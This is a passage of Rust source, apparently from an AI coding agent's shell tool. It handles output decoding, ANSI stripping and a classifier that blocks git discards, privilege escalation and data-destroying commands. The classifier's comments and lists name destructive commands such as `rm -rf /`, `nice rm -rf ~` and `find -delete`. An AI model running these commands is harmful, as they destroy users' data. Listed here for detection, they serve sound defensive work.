    let mut last_copied = 0usize; // command[..last_copied] has been flushed into `result`
    let mut changed = false;
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;
    while i < n {
        let c = bytes[i];
        if in_single {
            if c == b'\'' {
                in_single = false;
            }
            i += 1;
            continue;
        }
        if in_double {
            // Inside double quotes a backslash may escape the next byte (`\"`, `\\`).
            if c == b'\\' && i + 1 < n {
                i += 2;
                continue;
            }
            if c == b'"' {
                in_double = false;
            }
            i += 1;
            continue;
        }
        match c {
            b'\'' => {
                in_single = true;
                i += 1;
            }
            b'"' => {
                in_double = true;
                i += 1;
            }
            b'\\' if i + 1 < n => i += 2, // escaped char outside quotes — skip both
            b'>' => {
                // Consume the redirect operator: this `>` plus any immediately-following
                // `>` (append) / `|` (noclobber override). A leading fd (`2`, `&`) was
                // already emitted as an ordinary char before this `>`.
                let mut op_end = i + 1;
                while op_end < n && (bytes[op_end] == b'>' || bytes[op_end] == b'|') {
                    op_end += 1;
                }
                // Skip blanks between the operator and the target.
                let mut t = op_end;
                while t < n && (bytes[t] == b' ' || bytes[t] == b'\t') {
                    t += 1;
                }
                let is_nul = t + 3 <= n
                    && bytes[t].eq_ignore_ascii_case(&b'n')
                    && bytes[t + 1].eq_ignore_ascii_case(&b'u')
                    && bytes[t + 2].eq_ignore_ascii_case(&b'l')
                    && is_boundary(bytes.get(t + 3).copied());
                if is_nul {
                    // Flush everything up to (and including) the operator + blanks verbatim,
                    // then substitute the target.
                    result.push_str(&command[last_copied..t]);
                    result.push_str("/dev/null");
                    last_copied = t + 3;
                    changed = true;
                    i = t + 3;
                } else {
                    i = op_end; // not a nul target — resume scanning past the operator
                }
            }
            _ => i += 1,
        }
    }
    if !changed {
        return Cow::Borrowed(command);
    }
    result.push_str(&command[last_copied..]);
    Cow::Owned(result)
}

/// Windows shell selection. Returns `Ok(Command)` ready to spawn, or `Err(reason)` when
/// the command contains bash constructs that neither bash (absent) nor cmd.exe can handle
/// safely — the caller surfaces that as a clear tool error so the model can rewrite.
#[cfg(windows)]
fn build_command(command: &str) -> Result<tokio::process::Command, String> {
    if let Some(bash) = detect_windows_bash() {
        // Bash available (Git Bash / WSL / MSYS2) — route through it, unifying with
        // the Unix path. `bash -c "<script>"` honors bash quoting exactly as the model
        // expects; no silent corruption of `$()`, inline Python, or multi-line strings.
        // Rewrite the cmd.exe idiom `> nul` → `> /dev/null` first: under Git Bash `nul`
        // is a plain filename, so `> nul` would create a stray, undeletable `nul` file in
        // the cwd (see `rewrite_nul_redirect`).
        let command = rewrite_nul_redirect(command);
        let mut cmd = tokio::process::Command::new(bash);
        cmd.arg("-c").arg(command.as_ref());
        return Ok(cmd);
    }
    // No bash — cmd.exe fallback. Guard against constructs cmd.exe will silently corrupt
    // so the model gets a rewrite directive instead of a wasted turn (#883).
    if let Some(reason) = unsupported_bash_construct(command) {
        return Err(format!(
            "bash is not installed and cmd.exe cannot run this command: {}. \
             Rewrite for cmd.exe (use `%VAR%` for variables, avoid `$(...)`/backticks/\
             heredocs, use `-F file` for multi-line git commit messages), or install \
             Git Bash / WSL.",
            reason
        ));
    }
    // cmd.exe fallback — pass the command VERBATIM via `raw_arg` (preserves the pre-merge
    // HEAD fix): std's `.arg()` applies `CommandLineToArgvW` quoting that cmd.exe does NOT
    // follow, mangling embedded quotes (`node -e "..."`), `%VAR%`, `^`. Mirrors
    // atomcode-core's process_utils::shell_command / tool/bash.rs.
    use std::os::windows::process::CommandExt;
    let mut cmd = tokio::process::Command::new("cmd.exe");
    cmd.arg("/C");
    cmd.as_std_mut().raw_arg(command);
    Ok(cmd)
}

/// Decode subprocess output to text. UTF-8 is the fast path; if that fails we first
/// honor the console's OEM codepage (Windows), then use chardetng as a cross-platform
/// fallback. The latter covers commands such as `curl` returning a legacy GB2312/GBK
/// page on macOS/Linux without changing the command or its byte-level semantics.
pub(crate) fn decode_output(bytes: &[u8]) -> String {
    // Windows-native programs may write UTF-16 directly to a redirected pipe.  In
    // particular, wsl.exe's localized "install a distribution" diagnostic has
    // appeared in hook stdout this way.  UTF-16LE ASCII is also valid UTF-8 (with
    // embedded NULs), so this check MUST precede the UTF-8 fast path.
    if let Some(decoded) = decode_utf16_output(bytes) {
        return decoded;
    }
    match std::str::from_utf8(bytes) {
        Ok(s) => return s.to_string(),
        // A truncated multibyte tail (no `error_len`) means the valid prefix IS real
        // UTF-8 — lossy it rather than re-routing the whole buffer through a legacy
        // codepage and garbling the good prefix.
        Err(e) if e.error_len().is_none() => return String::from_utf8_lossy(bytes).into_owned(),
        Err(_) => {}
    }
    decode_oem(bytes, console_codepage())
}

/// Recognize redirected UTF-16 output by BOM or by the byte-position NUL bias of
/// console diagnostics.  The no-BOM heuristic also requires valid UTF-16 and a
/// printable decoded result, so ordinary binary/legacy output is not reinterpreted.
fn decode_utf16_output(bytes: &[u8]) -> Option<String> {
    let (little_endian, body, bom) = if bytes.starts_with(&[0xFF, 0xFE]) {
        (true, &bytes[2..], true)
    } else if bytes.starts_with(&[0xFE, 0xFF]) {
        (false, &bytes[2..], true)
    } else {
        if bytes.len() < 8 || bytes.len() % 2 != 0 {
            return None;
        }
        let pairs = bytes.len() / 2;
        let even_nuls = bytes.iter().step_by(2).filter(|&&byte| byte == 0).count();
        let odd_nuls = bytes
            .iter()
            .skip(1)
            .step_by(2)
            .filter(|&&byte| byte == 0)
            .count();
        // Localized diagnostics contain many non-ASCII UTF-16 code units (whose high
        // byte is non-zero), so do not require every other byte to be NUL.  A 20%
        // bias is enough when the decoded result also passes the strict text check
        // below; this still rejects ordinary binary and legacy multibyte text.
        if odd_nuls * 5 >= pairs && odd_nuls >= even_nuls.saturating_mul(3) {
            (true, bytes, false)
        } else if even_nuls * 5 >= pairs && even_nuls >= odd_nuls.saturating_mul(3) {
            (false, bytes, false)
        } else {
            return None;
        }
    };
    if body.len() % 2 != 0 {
        return None;
    }
    let units = body.chunks_exact(2).map(|pair| {
        if little_endian {
            u16::from_le_bytes([pair[0], pair[1]])
        } else {
            u16::from_be_bytes([pair[0], pair[1]])
        }
    });
    if bom {
        return Some(
            char::decode_utf16(units)
                .map(|item| item.unwrap_or('\u{FFFD}'))
                .collect(),
        );
    }
    let decoded: String = char::decode_utf16(units).collect::<Result<_, _>>().ok()?;
    let control_count = decoded
        .chars()
        .filter(|character| character.is_control() && !character.is_whitespace())
        .count();
    (control_count <= decoded.chars().count() / 20).then_some(decoded)
}

/// Decode `bytes` with a Windows OEM/ANSI codepage number. Pure and platform-independent
/// (so it is unit-testable off Windows). Mirrors `atomcode-core`'s decoder: when the OEM
/// codepage is 65001 ("Beta: Use Unicode UTF-8") the JVM/cmd.exe still emit legacy CJK
/// bytes, so try the CJK codepages; a codepage decode is only trusted when it does not
/// produce mostly replacement characters, else fall back to lossy UTF-8.
fn decode_oem(bytes: &[u8], codepage: u32) -> String {
    // 65001 is UTF-8 (already tried by the caller) → probe the common CJK codepages.
    let candidates: &[u32] = if codepage == 65001 {
        &[936, 950, 932, 949]
    } else {
        &[codepage]
    };
    for &cp in candidates {
        let enc = match cp {
            936 => encoding_rs::GB18030,   // Simplified Chinese (GBK superset)
            950 => encoding_rs::BIG5,      // Traditional Chinese
            932 => encoding_rs::SHIFT_JIS, // Japanese
            949 => encoding_rs::EUC_KR,    // Korean
            _ => continue,
        };
        let (decoded, _, had_errors) = enc.decode(bytes);
        if !had_errors {
            return decoded.into_owned();
        }
        // A mostly-clean decode (a few stray bytes) still beats all-U+FFFD UTF-8; but a
        // decode that is mostly garbage means this wasn't the right codepage.
        let replacements = decoded.chars().filter(|&c| c == '\u{FFFD}').count();
        if replacements > 0 && replacements < decoded.chars().count() / 2 {
            return decoded.into_owned();
        }
    }
    decode_detected(bytes)
}

/// Codex-style best-effort legacy decoder for subprocess output when neither UTF-8 nor
/// a known Windows OEM codepage applies. Detection is only reached for invalid UTF-8,
/// so ordinary command output is byte-for-byte unchanged on the fast path.
fn decode_detected(bytes: &[u8]) -> String {
    let mut detector = chardetng::EncodingDetector::new();
    detector.feed(bytes, true);
    let mut encoding = detector.guess(None, true);
    if encoding == encoding_rs::IBM866 && looks_like_windows_1252_punctuation(bytes) {
        encoding = encoding_rs::WINDOWS_1252;
    }
    let (decoded, _, had_errors) = encoding.decode(bytes);
    if !had_errors {
        decoded.into_owned()
    } else {
        String::from_utf8_lossy(bytes).into_owned()
    }
}

// chardetng can mistake short Windows-1252 strings containing curly quotes/dashes for
// IBM866 because those byte ranges overlap. Keep this deliberately narrow so genuine
// Cyrillic output is not rewritten.
const WINDOWS_1252_PUNCT_BYTES: [u8; 8] = [0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x99];

fn looks_like_windows_1252_punctuation(bytes: &[u8]) -> bool {
    let mut saw_punctuation = false;
    let mut saw_ascii_word = false;
    for &byte in bytes {
        if byte >= 0xA0 {
            return false;
        }
        if (0x80..=0x9F).contains(&byte) {
            if !WINDOWS_1252_PUNCT_BYTES.contains(&byte) {
                return false;
            }
            saw_punctuation = true;
        }
        saw_ascii_word |= byte.is_ascii_alphabetic();
    }
    saw_punctuation && saw_ascii_word
}

/// Decode a streamed subprocess chunk without replacing a multibyte character split across
/// two reads. UTF-8 can safely emit its valid prefix immediately. For legacy encodings, wait
/// for a line boundary (or EOF) before detecting/decoding so a read boundary cannot bisect a
/// GBK/Big5/Shift-JIS character.
fn decode_stream_chunk(pending: &mut Vec<u8>, bytes: &[u8], eof: bool) -> Option<String> {
    pending.extend_from_slice(bytes);
    if pending.is_empty() {
        return None;
    }

    match std::str::from_utf8(pending) {
        Ok(text) => {
            let text = text.to_owned();
            pending.clear();
            return Some(text);
        }
        Err(error) if error.error_len().is_none() => {
            let valid_up_to = error.valid_up_to();
            if valid_up_to == 0 {
                return None;
            }
            let text = std::str::from_utf8(&pending[..valid_up_to])
                .expect("valid_up_to must end at a UTF-8 boundary")
                .to_owned();
            pending.drain(..valid_up_to);
            return Some(text);
        }
        Err(_) => {}
    }

    let emit_len = if eof {
        pending.len()
    } else {
        pending
            .iter()
            .rposition(|byte| matches!(byte, b'\n' | b'\r'))
            .map_or(0, |index| index + 1)
    };
    if emit_len == 0 {
        return None;
    }
    let text = decode_output(&pending[..emit_len]);
    pending.drain(..emit_len);
    Some(text)
}

#[cfg(windows)]
fn console_codepage() -> u32 {
    extern "system" {
        fn GetOEMCP() -> u32;
    }
    // SAFETY: GetOEMCP takes no args and only reads a process-global codepage value.
    unsafe { GetOEMCP() }
}

#[cfg(not(windows))]
fn console_codepage() -> u32 {
    0 // no OEM codepage off Windows → decode_oem delegates to chardetng
}

/// CSI parameter/intermediate/final consumption. `start` points just past the
/// introducer (`ESC [` or C1 `0x9B`). Returns the index one past the final byte.
/// CSI = (params: 0x30-0x3f) (intermediates: 0x20-0x2f) (final: 0x40-0x7e).
fn consume_csi(bytes: &[u8], start: usize) -> usize {
    let mut j = start;
    while j < bytes.len() && (0x30..=0x3f).contains(&bytes[j]) {
        j += 1;
    }
    while j < bytes.len() && (0x20..=0x2f).contains(&bytes[j]) {
        j += 1;
    }
    if j < bytes.len() {
        j += 1; // consume final byte
    }
    j
}

/// String-sequence consumption for OSC / DCS / SOS / PM / APC. `start` points
/// just past the introducer; scans to the string terminator and returns the
/// index one past it. Terminator = BEL (`0x07`), 7-bit ST (`ESC \`), or 8-bit
/// C1 ST (U+009C, encoded `0xC2 0x9C`). An embedded lone ESC that is not `ESC \`
/// is skipped (matches xterm behaviour).
fn consume_string_sequence(bytes: &[u8], start: usize) -> usize {
    let mut j = start;
    while j < bytes.len() {
        if bytes[j] == 0x07 {
            return j + 1;
        }
        if bytes[j] == 0x1b && j + 1 < bytes.len() && bytes[j + 1] == b'\\' {
            return j + 2;
        }
        if bytes[j] == 0xc2 && j + 1 < bytes.len() && bytes[j + 1] == 0x9c {
            return j + 2;
        }
        j += 1;
    }
    j
}

/// Strip ANSI escape sequences and resolve `\r` progress-line rewrites so bash
/// output is clean text before it enters the model's context (and, downstream,
/// the TUI). Without this, git hooks / cargo / docker / progress bars emit CSI
/// colour+cursor sequences and `\r` cursor-returns: the escape codes waste tokens
/// and confuse the model, and every intermediate progress-bar frame gets spliced
/// in verbatim. Extends the v1 editor's `sanitize_terminal_output`
/// (`atomcode-core/src/tool/bash.rs`) with 8-bit C1 introducers and DCS/SOS/PM/APC
/// string sequences.
fn sanitize_terminal_output(s: &str) -> String {
    if s.is_empty() {
        return String::new();
    }
    // Strip ANSI escape sequences in a single byte pass (no `regex` crate). We handle
    // both introducer forms:
    //   * 7-bit: `ESC [` (CSI), `ESC ]` (OSC), `ESC P/X/^/_` (DCS/SOS/PM/APC string
    //     sequences), and any other solo two-byte `ESC X`.
    //   * 8-bit C1: since `s` is valid UTF-8, C1 controls appear as their two-byte
    //     encoding `0xC2 0x8_/0x9_` (e.g. U+009B CSI = `0xC2 0x9B`). We route the
    //     string/CSI introducers accordingly; other lone C1 controls fall through to
    //     the trailing control-character filter below.
    let bytes = s.as_bytes();
    let mut stripped: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == 0x1b && i + 1 < bytes.len() {
            match bytes[i + 1] {
                b'[' => {
                    i = consume_csi(bytes, i + 2);
                    continue;
                }
                // OSC and the DCS/SOS/PM/APC string sequences all run to a string
                // terminator, so share one consumer. (v1 dropped only 2 bytes of
                // `ESC P/X/^/_`, leaking the payload + ST — fixed here.)
                b']' | b'P' | b'X' | b'^' | b'_' => {
                    i = consume_string_sequence(bytes, i + 2);
                    continue;
                }
                _ => {
                    // Two-byte escape (e.g. ESC =, ESC >, ESC M, …) — drop both.
                    i += 2;
                    continue;
                }
            }
        }
        // 8-bit C1 introducers, UTF-8 encoded as `0xC2 0x9_`.
        if b == 0xc2 && i + 1 < bytes.len() {
            match bytes[i + 1] {
                0x9b => {
                    i = consume_csi(bytes, i + 2); // CSI (U+009B)
                    continue;
                }
                // OSC (U+009D) + DCS (U+0090) / SOS (U+0098) / PM (U+009E) / APC (U+009F).
                0x9d | 0x90 | 0x98 | 0x9e | 0x9f => {
                    i = consume_string_sequence(bytes, i + 2);
                    continue;
                }
                _ => {}
            }
        }
        stripped.push(b);
        i += 1;
    }
    // Lossy decode: the strip phase removes whole escape sequences, but a
    // pathological ESC followed by a UTF-8 continuation byte could still
    // produce invalid UTF-8 — lossy keeps us safe without another allocation
    // in the common case.
    let cleaned = String::from_utf8_lossy(&stripped).into_owned();

    // Resolve `\r` progress rewrites. For each logical line, when `\r` appears
    // mid-line the terminal would repaint from column 0, so only the suffix
    // after the final `\r` is actually visible to the user. We keep just that.
    let mut out = String::with_capacity(cleaned.len());
    for (idx, line) in cleaned.split('\n').enumerate() {
        if idx > 0 {
            out.push('\n');
        }
        let line = line.trim_end_matches('\r');
        if let Some(pos) = line.rfind('\r') {
            out.push_str(&line[pos + 1..]);
        } else {
            out.push_str(line);
        }
    }

    // Drop any remaining C0 control characters except tab and newline — they
    // render as glyph garbage and add nothing for the model.
    out.chars()
        .filter(|c| *c == '\n' || *c == '\t' || !c.is_control())
        .collect()
}

fn format_output(output: &std::process::Output) -> ToolResult {
    let stdout = sanitize_terminal_output(&decode_output(&output.stdout));
    let stderr = sanitize_terminal_output(&decode_output(&output.stderr));
    let mut s = String::new();
    if !stdout.is_empty() {
        s.push_str(&stdout);
    }
    if !stderr.trim().is_empty() {
        if !s.is_empty() && !s.ends_with('\n') {
            s.push('\n');
        }
        s.push_str("[stderr]\n");
        s.push_str(&stderr);
    }
    match output.status.code() {
        Some(0) => {
            if s.trim().is_empty() {
                s = "(no output)".to_string();
            }
        }
        Some(code) => {
            if !s.is_empty() && !s.ends_with('\n') {
                s.push('\n');
            }
            s.push_str(&format!("[exit code {code}]"));
        }
        // On Unix, code()==None means the child was terminated by a signal (NOT our
        // cancel/timeout paths, which return early before reaching here).
        None => {
            if !s.is_empty() && !s.ends_with('\n') {
                s.push('\n');
            }
            s.push_str("[process terminated by signal]");
        }
    }
    // The bash invocation itself ran; a non-zero exit is reported in-band (the model
    // reads the exit code) rather than as a tool error.
    ok(s)
}

/// Whether a `git checkout` operand is (heuristically) a FILE pathspec rather than a
/// branch/ref/tag. Branch names — even with slashes or version dots (`release/v5.0.0`,
/// `feature/foo`, `v1.2.3`) — must NOT match, so we key on leading-dot / trailing-slash paths, a
/// KNOWN source/config file-extension set, and common extensionless project files — NOT on `/` or
/// any dot (both appear in branch/tag names). Operand is assumed already lowercased.
///
/// This is a heuristic: an unknown extension or an unusual extensionless filename that shares no
/// marker with a path (`git checkout weirdname`) is treated as a branch and slips through — the
/// residual blind spot the persona RISKY-ACTIONS rule backstops. False NEGATIVES (miss a discard)
/// are the risk; we bias the markers below toward catching real files.
fn git_operand_looks_like_pathspec(arg: &str) -> bool {
    // Operands may arrive quoted (`"src/main.rs"`); strip one layer so the ext check sees the path.
    let arg = arg.trim_matches(|c| c == '"' || c == '\'');
    if arg.is_empty() || arg.starts_with('-') {
        return false; // a flag / ref, not a path operand
    }
    // `.`/`..`/`./x`/`../x`, dotfiles (`.gitignore`, `.env`), and directory pathspecs (`src/`).
    if arg == "."
        || arg == ".."
        || arg.starts_with("./")
        || arg.starts_with("../")
        || arg.starts_with('.')
        || arg.ends_with('/')
    {
        return true;
    }
    // Extensionless files that are unmistakably working-tree paths, not branch/tag names.
    const EXTENSIONLESS_FILES: &[&str] = &[
        "makefile",
        "gnumakefile",
        "dockerfile",
        "containerfile",
        "gemfile",
        "rakefile",
        "procfile",
        "jenkinsfile",
        "vagrantfile",
        "brewfile",
        "license",
        "readme",
        "changelog",
        "notice",
        "authors",
        "copying",
    ];
    if EXTENSIONLESS_FILES.contains(&arg) {
        return true;
    }
    const FILE_EXTS: &[&str] = &[
        "rs",
        "ts",
        "tsx",
        "js",
        "jsx",
        "mjs",
        "cjs",
        "py",
        "go",
        "java",
        "kt",
        "kts",
        "c",
        "cc",
        "cpp",
        "cxx",
        "h",
        "hh",
        "hpp",
        "rb",
        "php",
        "cs",
        "swift",
        "scala",
        "clj",
        "ex",
        "exs",
        "erl",
        "hs",
        "ml",
        "dart",
        "zig",
        "nim",
        "toml",
        "json",
        "yaml",
        "yml",
        "xml",
        "html",
        "htm",
        "css",
        "scss",
        "sass",
        "less",
        "md",
        "mdx",
        "txt",
        "lock",
        "sql",
        "proto",
        "graphql",
        "gradle",
        "sh",
        "bash",
        "zsh",
        "fish",
        "ps1",
        "bat",
        "cmd",
        "ini",
        "cfg",
        "conf",
        "env",
        "properties",
        "tf",
        "cmake",
        "vue",
        "svelte",
        "astro",
    ];
    let ext = arg.rsplit('.').next().unwrap_or("");
    ext != arg && FILE_EXTS.contains(&ext) // `ext != arg` ⇒ the name actually contained a `.`
}

/// Detects a git subcommand that DISCARDS uncommitted work — the reported data-loss footgun.
/// Single, whitespace-robust owner for `checkout <pathspec>` / `switch --force` / `restore <file>`
/// / `reset --hard` / `clean -f` (so all discard forms are caught consistently regardless of
/// spacing). Branch/tag operations are left alone. `git stash` is intentionally NOT flagged — it
/// is recoverable via `git stash list` / `pop`. (`git push --force` / `branch -D` / history
/// rewrites are a different category, handled by the substring table.)
fn git_worktree_discard(cmd: &str) -> Option<&'static str> {
    let mut it = cmd.split_whitespace().peekable();
    // A compound part may lead with a shell keyword from a for/while/if BODY (`… ; do git
    // checkout . ; done`) — skip them so the loop body is still inspected.
    while let Some(&kw) = it.peek() {
        if matches!(kw, "do" | "then" | "else" | "{") {
            it.next();
        } else {
            break;
        }
    }
    let first = it.next()?;
    if first.rsplit('/').next().unwrap_or(first) != "git" {
        return None; // not a git invocation (path-qualified `/usr/bin/git` still matches)
    }
    // Skip git's global options to reach the subcommand. Value-taking global flags consume the
    // FOLLOWING token too (unless glued with `=`). `-C` lowercases to `-c`.
    const VALUE_FLAGS: &[&str] = &[
        "-c",
        "--git-dir",
        "--work-tree",
        "--namespace",
        "--exec-path",
    ];
    let mut sub: Option<&str> = None;
    let mut args: Vec<&str> = Vec::new();
    while let Some(t) = it.next() {
        if sub.is_none() {
            if t.starts_with('-') {
                if !t.contains('=') && VALUE_FLAGS.contains(&t) {
                    it.next(); // skip the flag's separate value token
                }
                continue;
            }
            sub = Some(t);
        } else {
            args.push(t);
        }
    }
    match sub? {
        // `git restore <file>` discards working-tree changes. `--staged` WITHOUT `--worktree`
        // only unstages (fully recoverable) → not a discard.
        "restore" => {
            let staged = args.iter().any(|a| *a == "--staged" || *a == "-s");
            let worktree = args.iter().any(|a| *a == "--worktree" || *a == "-w");
            if staged && !worktree {
                return None;
            }
            Some("git restore (discards uncommitted working-tree changes)")
        }
        // A force flag, an explicit pathspec separator / current-dir / glob, or a file-looking
        // operand ⇒ this overwrites uncommitted files. A bare branch/tag operand (or `-b` create)
        // has none of these → safe. Checking the markers (not a branch whitelist) means
        // `checkout --detach -- file` and `checkout -b tmp -- .` are still caught.
        "checkout" | "switch" => {
            let discards = args.iter().any(|a| {
                matches!(
                    *a,
                    "--" | "." | ".." | "*" | "-f" | "--force" | "--discard-changes"
                )
            }) || args.iter().any(|a| git_operand_looks_like_pathspec(a));
            discards.then_some("git checkout/switch that overwrites uncommitted file changes")
        }
        "reset" => args
            .iter()
            .any(|a| matches!(*a, "--hard" | "--merge" | "--keep"))
            .then_some("git reset --hard/--merge/--keep (discards uncommitted changes)"),
        // `git clean` only deletes with `-f`/`--force` (short flags may bundle: `-fd`, `-xdf`).
        "clean" => args
            .iter()
            .any(|a| {
                *a == "--force" || (a.starts_with('-') && !a.starts_with("--") && a.contains('f'))
            })
            .then_some("git clean -f (deletes untracked files)"),
        _ => None,
    }
}

/// Classify a shell command as destructive (returns `Some(reason)`) or not (`None`).
/// Strip bash line comments so a `#…` note can't smuggle a scary substring past the
/// substring-based classifier below (`sleep 1 # kill the cache` must NOT read as a `kill -9`).
/// Quote-aware and word-boundary-aware: a `#` only starts a comment when UNQUOTED and at the start
/// of a word (preceded by whitespace / start-of-input / a shell metachar), matching bash. (Quoted
/// occurrences like `echo 'kill -9'` are NOT stripped — that would need full AST parsing.)
pub fn strip_bash_comments(cmd: &str) -> String {
    let mut out = String::with_capacity(cmd.len());
    let mut quote: Option<char> = None;
    let mut prev_is_boundary = true; // start-of-input is a word boundary
    let mut chars = cmd.chars();
    while let Some(c) = chars.next() {
        if let Some(q) = quote {
            out.push(c);
            // In double quotes (not single), backslash escapes the next char — including `"`, which
            // therefore does NOT close the string. Emit both verbatim so an escaped quote can't
            // desync our quote tracking and make later text look "unquoted" (over-stripping a real
            // command as if it were a comment).
            if q == '"' && c == '\\' {
                if let Some(n) = chars.next() {
                    out.push(n);
                }
                prev_is_boundary = false;
                continue;
            }
            if c == q {
                quote = None;
            }
            prev_is_boundary = false;
            continue;
        }
        match c {
            '\\' => {
                // Unquoted backslash escapes the next char: it becomes a literal word character,
                // never a metacharacter (`;`, `&`, `|`) or a comment introducer (`#`). Emit both
                // verbatim and treat the pair as a non-boundary, so `\;#…` / `\#` don't trigger a
                // spurious comment strip that would delete a following real command.
                out.push(c);
                if let Some(n) = chars.next() {
                    out.push(n);
                }
                prev_is_boundary = false;
            }
            '\'' | '"' => {
                out.push(c);
                quote = Some(c);
                prev_is_boundary = false;
            }
            '#' if prev_is_boundary => {
                // Comment runs to end of line; keep the newline so multi-line commands survive.
                for n in chars.by_ref() {
                    if n == '\n' {
                        out.push('\n');
                        break;
                    }
                }
                prev_is_boundary = true;
            }
            _ => {
                out.push(c);
                prev_is_boundary = c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(');
            }
        }
    }
    out
}

/// The "Always allow" grant key for a bash command: comments stripped + whitespace collapsed, so a
/// cosmetic re-emit of the SAME command (a changed trailing `# comment`, extra spaces) keeps the
/// grant instead of re-prompting. Stays PER-COMMAND (not a `rm *` family prefix): every bash
/// approval is for a destructive command, so a family prefix would over-approve.
pub fn normalize_command_for_grant(command: &str) -> String {
    strip_bash_comments(command)
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Faithful, condensed port of the production `check_destructive_command`: it
/// normalizes simple quoting, strips wrappers, and recurses into subshells / eval /
/// compound parts / pipe-to-shell so a destructive command cannot hide one layer down.
pub fn check_destructive_command(command: &str) -> Option<String> {
    // Strip comments first — the classifier is substring-based, so a `# rm -rf everything` note
    // would otherwise read as a destructive command.
    let command = strip_bash_comments(command);
    let command = command.as_str();
    let cmd = command.to_lowercase();

    fn base(token: &str) -> &str {
        token.rsplit('/').next().unwrap_or(token)
    }
    fn normalize(token: &str) -> String {
        token
            .chars()
            .filter(|c| !matches!(c, '\'' | '"' | '\\'))
            .collect()
    }
    fn uses_expansion(token: &str) -> bool {
        token.contains('$') || token.contains('`')
    }
    fn rm_flags(cmd: &str) -> (bool, bool) {
        let (mut rec, mut force) = (false, false);
        for tok in cmd.split_whitespace().skip(1) {
            if !tok.starts_with('-') {
                break;
            }
            let fc: Vec<char> = tok.chars().skip(1).collect();
            rec |= fc.contains(&'r') || fc.contains(&'R');
            force |= fc.contains(&'f') || fc.contains(&'F');
        }
        (rec, force)
    }
    fn is_artifact_target(token: &str) -> bool {
        let t = token.trim_matches(|c: char| c == '"' || c == '\'' || c == ';');
        if t.is_empty() || t.starts_with('-') {
            return false;
        }
        let last = t.trim_end_matches('/').rsplit('/').next().unwrap_or(t);
        matches!(
            last,
            "node_modules" | "dist" | "build" | ".cache" | "target" | "__pycache__" | ".tmp"
        )
    }
    fn is_artifact_cleanup(cmd: &str) -> bool {
        let mut saw = false;
        for tok in cmd.split_whitespace().skip(1) {
            if tok.starts_with('-') {
                continue;
            }
            saw = true;
            if !is_artifact_target(tok) {
                return false;
            }
        }
        saw
    }
    fn first_matches(cmd: &str, targets: &[&str]) -> bool {
        cmd.split_whitespace()
            .next()
            .map(|f| targets.contains(&base(&normalize(f))))
            .unwrap_or(false)
    }
    fn extract_script(cmd: &str, shell: &str) -> Option<String> {
        for pat in [
            format!("{shell} -c "),
            format!("{shell} -lc "),
            format!("/{shell} -c "),
            format!("/{shell} -lc "),
        ] {
            if let Some(pos) = cmd.find(&pat) {
                let after = &cmd[pos + pat.len()..];
                let script = if after.starts_with('"') || after.starts_with('\'') {
                    let q = after.chars().next()?;
                    match after[1..].find(q) {
                        Some(end) => after[1..end + 1].to_string(),
                        None => after[1..].to_string(),
                    }
                } else {
                    let end = after.find([';', '&', '|', '\n']).unwrap_or(after.len());
                    after[..end].to_string()
                };
                return Some(script);
            }
        }
        None
    }

    // Unwrap leading wrapper commands (timeout/env/nice/strace/…) and re-check, so a
    // wrapped destructive command (`timeout 10 rm -rf /`, `nice rm -rf ~`) cannot evade
    // the first-token checks below.
    fn strip_wrappers(cmd: &str) -> String {
        const WRAPPERS: &[&str] = &[
            "env", "nice", "nohup", "timeout", "strace", "ionice", "taskset", "setsid", "screen",
            "tmux", "script", "unshare", "nsenter", "chroot", "setarch", "linux32", "linux64",
        ];
        const KNOWN: &[&str] = &[
            "rm", "dd", "chmod", "chown", "chgrp", "mkfs", "format", "drop", "python", "perl",
            "ruby", "php", "node",
        ];
        fn b(t: &str) -> &str {
            t.rsplit('/').next().unwrap_or(t)
        }
        let toks: Vec<&str> = cmd.split_whitespace().collect();
        if toks.is_empty() || !WRAPPERS.contains(&b(toks[0])) {
            return cmd.to_string();
        }
        let mut skip = 1;
        while skip < toks.len() {
            let t = toks[skip];
            // Skip the wrapper's flags / values / env-assignments; stop at a real command
            // (a known destructive one, or a path-qualified token).
            if !t.starts_with('-')
                && !t.contains('=')
                && t != "sudo"
                && !WRAPPERS.contains(&b(t))
                && (KNOWN.contains(&b(t)) || t.starts_with('/'))
            {
                break;
            }
            skip += 1;
        }
        if skip < toks.len() {
            toks[skip..].join(" ")
        } else {
            String::new()
        }
    }
    let stripped = strip_wrappers(&cmd);
    if stripped != cmd && !stripped.is_empty() {
        if let Some(r) = check_destructive_command(&stripped) {
            return Some(r);
        }
    }

    // Privilege escalation.
    for tool in [
        "sudo",
        "doas",
        "pkexec",
        "run0",
        "dzdo",
        "pfexec",
        "systemd-run",
        "runuser",
        "su",
        "machinectl",
    ] {
        if cmd.split_whitespace().any(|t| base(t) == tool) {
            return Some(format!("privilege escalation via {tool}"));
        }
    }
    // find -delete / -exec rm.
    if first_matches(&cmd, &["find"]) {
        if cmd.contains("-delete") {
            return Some("find -delete".to_string());
        }
        if cmd.contains("-exec")
            && cmd
                .split("-exec")
                .nth(1)
                .map(|a| a.contains("rm"))
                .unwrap_or(false)
        {
            return Some("find -exec rm".to_string());
        }
    }
    // xargs / parallel running a destructive command — `rm`, or a bulk working-tree revert
    // (`git ls-files -m | xargs git checkout` / `git restore` discards EVERY modified file).
    if (cmd.contains("xargs") || first_matches(&cmd, &["parallel"]))
        && (cmd.contains("rm") || cmd.contains("git checkout") || cmd.contains("git restore"))
    {
        return Some("destructive command via xargs/parallel".to_string());
    }
    // Subshell recursion: `<shell> -c "..."`.
    for shell in [
        "bash", "sh", "zsh", "dash", "ash", "ksh", "python", "python3", "perl", "ruby", "node",
    ] {
        if cmd.contains(&format!("{shell} -c")) || cmd.contains(&format!("{shell} -lc")) {
            if let Some(script) = extract_script(&cmd, shell) {
                if let Some(r) = check_destructive_command(&script) {
                    return Some(format!("destructive in subshell ({shell} -c): {r}"));
                }
            }
        }
    }
    // eval recursion.
    if let Some(rest) = cmd.strip_prefix("eval ") {
        if let Some(r) = check_destructive_command(rest.trim()) {
            return Some(format!("destructive via eval: {r}"));
        }
    }
    // Compound parts: ; && || | — recurse each non-trivial part.
    for sep in [";", "&&", "||", "|"] {
        if cmd.contains(sep) {
            for part in cmd.split(sep) {
                let t = part.trim();
                if t.is_empty() || t.split_whitespace().count() == 1 {
                    continue;
                }
